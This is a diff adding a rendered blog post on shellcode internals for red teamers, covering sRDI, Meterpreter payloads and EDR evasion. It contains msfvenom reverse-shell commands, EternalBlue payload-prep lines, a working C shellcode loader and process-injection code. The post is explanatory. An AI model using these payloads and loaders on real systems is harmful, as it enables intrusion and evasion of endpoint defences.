@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Long Live The Shellcode | gatari&#39;s blog</title>
+<meta property="og:title" content="Long Live The Shellcode | gatari&#39;s blog" />
+<meta name="twitter:title" content="Long Live The Shellcode | gatari&#39;s blog" />
+<meta itemprop="name" content="Long Live The Shellcode | gatari&#39;s blog" />
+<meta name="application-name" content="Long Live The Shellcode | gatari&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="offensive security research">
+<meta itemprop="description" content="offensive security research" />
+<meta property="og:description" content="offensive security research" />
+<meta name="twitter:description" content="offensive security research" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/long-live-the-shellcode/" title="English" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2025-02-28T00:00:00Z />
+    <meta property="article:published_time" content=2025-02-28T00:00:00Z />
+    <meta property="og:url" content="http://localhost:1313/posts/long-live-the-shellcode/" />
+
+    
+    <meta property="og:article:author" content="" />
+    <meta property="article:author" content="" />
+    <meta name="author" content="" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Long Live The Shellcode",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2025-02-28",
+        "description": "",
+        "wordCount":  1326 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2025-02-28",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "gatari\u0027s blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.123.8">
+
+    
+    <meta property="og:title" content="Long Live The Shellcode" />
+<meta property="og:description" content="This blog post is meant to directly support the talk I did for a N0H4TS fireside chat - you can find the slides: here.
+Overview Often when newcomers encounter shellcode, whether through a security course, a CTF challenge, or a blog post - they tend to overlook the underlying mechanics of the code they are executing. This understanding is further abstracted away when using a C2 framework, which handles the intricacies behind the scenes." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/long-live-the-shellcode/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-02-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-02-28T00:00:00+00:00" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Long Live The Shellcode"/>
+<meta name="twitter:description" content="This blog post is meant to directly support the talk I did for a N0H4TS fireside chat - you can find the slides: here.
+Overview Often when newcomers encounter shellcode, whether through a security course, a CTF challenge, or a blog post - they tend to overlook the underlying mechanics of the code they are executing. This understanding is further abstracted away when using a C2 framework, which handles the intricacies behind the scenes."/>
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/long-live-the-shellcode/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Long Live The Shellcode</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2025-02-28T00:00:00&#43;00:00" itemprop="datePublished"> 28 Feb 2025 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#shellcode---a-primer">Shellcode - A Primer</a>
+      <ul>
+        <li><a href="#debugging-shellcode">Debugging Shellcode</a></li>
+        <li><a href="#reflective-dll-injection">Reflective DLL Injection</a></li>
+        <li><a href="#shellcode-reflective-dll-injection-srdi">Shellcode Reflective DLL Injection (sRDI)</a></li>
+      </ul>
+    </li>
+    <li><a href="#meterpreter-payloads">Meterpreter Payloads</a></li>
+    <li><a href="#considerations-for-evasion">Considerations for Evasion</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <p>This blog post is meant to directly support the <a href="https://www.linkedin.com/posts/n0h4ts_rescheduled-are-you-interested-and-ready-activity-7295820825918611456-Oyyw?utm_source=share&utm_medium=member_desktop&rcm=ACoAAD7pUncBxZ8Rxa4MkspWW4IiCPHKOwK-brc">talk</a> I did for a N0H4TS fireside chat - you can find the slides: <a href="https://docs.google.com/presentation/d/1qn-JkqwkYZCY391gZNmPZhTw9gYENIbhgRNJAg3dXf0/edit?usp=sharing">here</a>.</p>
+<p><img alt="Slide 1" src="./Demystifying%20AV_EDR%20Evasion%20(Public).jpg"></p>
+<h2 id="overview">Overview</h2>
+<p>Often when newcomers encounter shellcode, whether through a security course, a CTF challenge, or a blog post - they tend to overlook the underlying mechanics of the code they are executing. This understanding is further abstracted away when using a C2 framework, which handles the intricacies behind the scenes.</p>
+<p>When dealing with simpler defense mechanisms like Anti-Virus (AV), operators typically don&rsquo;t need a deep understanding of their shellcode&rsquo;s behavior. However, when attempting to bypass more advanced solutions like <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/">Endpoint Detection and Response (EDR)</a> - I&rsquo;ve witnessed operators struggle, and entire engagements fail due to a lack of understanding of <em>what they are even evading</em> and <em>what their tools are doing</em>.</p>
+<h2 id="shellcode---a-primer">Shellcode - A Primer</h2>
+<blockquote>
+<p>&ldquo;shellcode&rdquo; in this context refers to PIC payloads generated exclusively by C2 frameworks that use the <a href="https://github.com/monoxgas/sRDI">Shellcode Reflective DLL Injection (sRDI)</a> technique, <strong>not</strong> true position-independent shellcode such as those seen <a href="https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows/x64/src">here</a>.</p>
+</blockquote>
+<p>If you have been doing offensive security for a while, you have likely come across &ldquo;shellcode&rdquo; in one of many ways. For example, generating a <a href="https://github.com/rapid7/metasploit-payloads">meterpreter</a> payload with <code>msfvenom</code> and the following arguments may be familiar:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f raw
+</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Completing available payloads
+</span></span><span class="line"><span class="cl">windows/x64/meterpreter_bind_named_pipe   -- Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
+</span></span><span class="line"><span class="cl">windows/x64/meterpreter_bind_tcp          -- Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
+</span></span><span class="line"><span class="cl">windows/x64/meterpreter_reverse_http      -- Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
+</span></span><span class="line"><span class="cl">windows/x64/meterpreter_reverse_https     -- Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
+</span></span><span class="line"><span class="cl">windows/x64/meterpreter_reverse_ipv6_tcp  -- Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
+</span></span><span class="line"><span class="cl">windows/x64/meterpreter_reverse_tcp       -- Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
+</span></span></code></pre></div><p>Or, if you have ever used one of the <a href="https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/shellcode/shell_prep.sh">AutoBlue-MS17-010</a> exploit for EternalBlue (MS17-010) - you may have seen the following commands executed to prepare shellcode for the exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> <span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$cmd</span><span class="s2">&#34;</span> -eq <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> Type <span class="m">0</span> to generate a staged payload or <span class="m">1</span> to generate a stageless payload
+</span></span><span class="line"><span class="cl">        <span class="nb">read</span> staged
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$staged</span><span class="s2">&#34;</span> -eq <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
+</span></span><span class="line"><span class="cl">            msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$portOne</span>
+</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
+</span></span><span class="line"><span class="cl">            msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$portTwo</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$staged</span><span class="s2">&#34;</span> -eq <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
+</span></span><span class="line"><span class="cl">            msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$portOne</span>
+</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
+</span></span><span class="line"><span class="cl">            msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$portTwo</span>
+</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
+</span></span></code></pre></div><h3 id="debugging-shellcode">Debugging Shellcode</h3>
+<p>Rather than going into the theory and source code behind shellcode, I believe it&rsquo;s more beneficial to understand how some (such as myself) operators get confused when copying and pasting shellcode loaders from the internet. For example, consider the following shellcode loader:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">...</span> <span class="p">};</span> 
+</span></span><span class="line"><span class="cl"><span class="n">INT</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">Addr</span>   <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">Handle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">Addr</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;[-] VirtualAlloc() failed: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">RtlCopyMemory</span><span class="p">(</span> <span class="n">Addr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">)</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">Handle</span> <span class="o">=</span> <span class="nf">CreateThread</span><span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Addr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;[-] CreateThread() failed: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">WaitForSingleObject</span><span class="p">(</span> <span class="n">Handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>When a debugger is attached to the process with breakpoints set on memory allocation (<code>NtAllocateVirtualMemory</code>), you may notice that (apart from your loader&rsquo;s calls) - there are additional calls to <code>NtAllocateVirtualMemory</code> made by the shellcode itself.</p>
+<p><img alt="Shellcode Debugging" src="./b53081b0a2eacc288033e6a60da4c154.png"></p>
+<p>This is because the shellcode uses a technique known as <a href="https://github.com/monoxgas/sRDI">Shellcode Reflective DLL Injection (sRDI)</a> to load itself into memory.</p>
+<h3 id="reflective-dll-injection">Reflective DLL Injection</h3>
+<p>Traditionally, DLLs are loaded from disk using APIs such as <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> or <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryExA</a>. However, the <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">Reflective DLL Injection</a> repository by Stephen Fewer demonstrates how to reflectively load a DLL in memory using a <code>ReflectiveLoader</code> function.</p>
+<p>The <code>ReflectiveLoader</code> function will do the heavy lifting of fixing relocations, import &amp; export tables, copying the DLL headers &amp; sections, and calling the DLL&rsquo;s entry point. The repository also includes an example of calling the <code>ReflectiveLoader</code> function from the loader using a <code>LoadRemoteLibraryR</code> function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">LoadRemoteLibraryR</span><span class="p">(</span> <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwLength</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="cp"># Finds the offset of the ReflectiveLoader() function from the base of the reflective DLL
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">dwReflectiveLoaderOffset</span> <span class="o">=</span> <span class="nf">GetReflectiveLoaderOffset</span><span class="p">(</span> <span class="n">lpBuffer</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cp"># Allocates memory for the reflective DLL
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">lpRemoteLibraryBuffer</span> <span class="o">=</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span> <span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">dwLength</span><span class="p">,</span> <span class="n">MEM_RESERVE</span><span class="o">|</span><span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cp"># Writes the reflective DLL allocated memory
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nf">WriteProcessMemory</span><span class="p">(</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">lpRemoteLibraryBuffer</span><span class="p">,</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">dwLength</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cp"># Calculates the absolute address of the ReflectiveLoader() function by adding the offset to the base address
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">lpReflectiveLoader</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)(</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">lpRemoteLibraryBuffer</span> <span class="o">+</span> <span class="n">dwReflectiveLoaderOffset</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cp"># Redirects execution to ReflectiveLoader()-&gt;ReflectiveDLL
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">hThread</span> <span class="o">=</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span> <span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">,</span> <span class="n">lpReflectiveLoader</span><span class="p">,</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The reflective loading process can be visually represented as follows:</p>
+<p><img alt="Reflective DLL Injection" src="./e3aaad9ffe2e5912e18c283489086db0.png"></p>
+<p>You may realize that the implementation of <code>LoadRemoteLibraryR</code> closely resembles our shellcode loader, except that execution is redirected to the <code>ReflectiveLoader</code> function rather than the base address of the shellcode.</p>
+<h3 id="shellcode-reflective-dll-injection-srdi">Shellcode Reflective DLL Injection (sRDI)</h3>
+<p>The <a href="https://github.com/monoxgas/sRDI">Shellcode Reflective DLL Injection (sRDI)</a> technique takes advantage of the reflective loading process by embedding a small assembly stub in the <code>ReflectiveDLL</code> itself that will redirect execution to the <code>ReflectiveLoader()</code> function - effectively bypassing the need for the <code>LoadRemoteLibraryR</code> function.</p>
+<p>As a result, the Reflective DLL can now effectively be treated like shellcode - as we can now redirect execution to the base address of the Reflective DLL, and ignore the need for calculating the offset of the <code>ReflectiveLoader</code> function.</p>
+<p><img alt="sRDI" src="./93f52aa2039d237706d1e717637fcfa6.png"></p>
+<p>For clarity, the stub will only calculate the absolute address of the <code>ReflectiveLoader</code> function and redirect execution to it and omit any allocation of memory as it assumes that the loader has already allocated memory for the Reflective DLL. An example of the above stub can be as simple as:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="c1">; gonna ignore all the setup and just show the stub
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>  <span class="no">rbx</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">dll_base_address</span><span class="err">&gt;</span>              <span class="c1">; base address of rDLL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">add</span>  <span class="no">rbx</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">offset_to_ReflectiveLoader</span><span class="p">()</span><span class="err">&gt;</span>  <span class="c1">; &amp;ReflectiveLoader = base + offset
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">call</span> <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>  <span class="no">rax</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">ExitProcess</span>                    <span class="c1">; exit process, alternatively ExitThread()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">call</span> <span class="no">rax</span>
+</span></span></code></pre></div><p>A similar stub can be found when decompiling the meterpreter shellcode generated by <code>msfvenom</code> in the DOS header:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span>  <span class="no">rbx</span><span class="p">,</span> <span class="mi">0x188D4</span>   <span class="c1">; &amp;ReflectiveLoader = base + 0x188D4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">call</span> <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span></code></pre></div><p>The <code>0x188D4</code> offset is baked into the stub at compile-time, and calculates to the RVA of <code>ReflectiveLoader</code>.</p>
+<p><img alt="RDL" src="./d2f4ab57d73dd24e2d45b88213ffce09%20(1).png"></p>
+<h2 id="meterpreter-payloads">Meterpreter Payloads</h2>
+<p>We know that Meterpreter&rsquo;s shellcode is actually a Reflective DLL with a hotpatched DOS header, we can now understand why the shellcode performs memory allocations when debugging. The shellcode is effectively loading itself into memory using the sRDI technique.</p>
+<p>The position-independent nature of meterpreter&rsquo;s shellcode allows for a plethora of executable formats exposed by <code>msfvenom</code> as the executables simply need to be a shellcode loader. Unfortunately Meterpreter, in fact, is not rewritten in all of these languages:</p>
+<pre tabindex="0"><code>Framework Executable Formats [--format &lt;value&gt;]
+===============================================
+
+    Name
+    ----
+    asp
+    aspx
+    aspx-exe
+    axis2
+    dll
+    ducky-script-psh
+    elf
+    elf-so
+    exe
+    exe-only
+    exe-service
+    exe-small
+    hta-psh
+    jar
+    jsp
+    loop-vbs
+    macho
+    msi
+    msi-nouac
+    osx-app
+    psh
+    psh-cmd
+    psh-net
+    psh-reflection
+    python-reflection
+    vba
+    vba-exe
+    vba-psh
+    vbs
+    war
+</code></pre><h2 id="considerations-for-evasion">Considerations for Evasion</h2>
+<p>Certain EDR solutions closely analyze memory allocations, and often flag on certain &ldquo;rules&rdquo; in memory management. For example, Elastic often flags on <a href="https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts%20unbacked&type=code">unbacked (non-module backed)</a> memory performing some operations.</p>
+<p>Unfortunately, this memory may not always be directly managed by the shellcode loader, but rather by the shellcode itself (in the case of C2s that use Reflective Loading). Some C2 frameworks expose an interface to modify the Reflective Loader such as the <a href="https://www.cobaltstrike.com/product/features/user-defined-reflective-loader">User-Defined Reflective Loader</a> in Cobalt Strike, and obviously operators can freely modify the reflective loader of open-source C2s such as <a href="https://github.com/HavocFramework/Havoc">Havoc</a>.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Understanding how shellcode operates is crucial for evading EDR solutions. Some red teams struggle with evasion because they rely on copying shellcode loaders from the internet or using payload generators without modifying the shellcode itself.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
